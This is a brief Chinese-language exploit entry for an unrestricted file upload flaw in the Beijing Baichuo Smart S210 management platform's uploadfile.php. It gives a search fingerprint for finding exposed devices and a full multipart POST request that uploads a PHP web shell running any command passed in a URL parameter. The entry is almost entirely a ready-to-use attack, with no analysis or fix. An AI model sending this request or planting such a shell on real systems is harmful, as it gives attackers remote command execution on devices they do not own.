# 北京百绰智能S210管理平台uploadfile.php无限制上传漏洞

- **系统**：北京百绰智能S210管理平台uploadfile.php无限制上传　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`title="Smart管理平台"`
- **请求**：`POST /Tool/uploadfile.php? HTTP/1.1`
- **关键头**：`Cookie: PHPSESSID=fd847fe4280e50c2c3855ffdee69b8f8`　`Content-Type: multipart/form-data; boundary=---------------------------139…`　`Sec-Fetch-User: ?1`

**请求体 / payload**
```
-----------------------------13979701222747646634037182887
Content-Disposition: form-data; name="file_upload"; filename="contents.php"
Content-Type: application/octet-stream
<?php
system($_GET["c"]);
?>
-----------------------------13979701222747646634037182887
Content-Disposition: form-data; name="txt_path"
/home/dudesite.php
-----------------------------13979701222747646634037182887--
```
- **预期**：200　|　—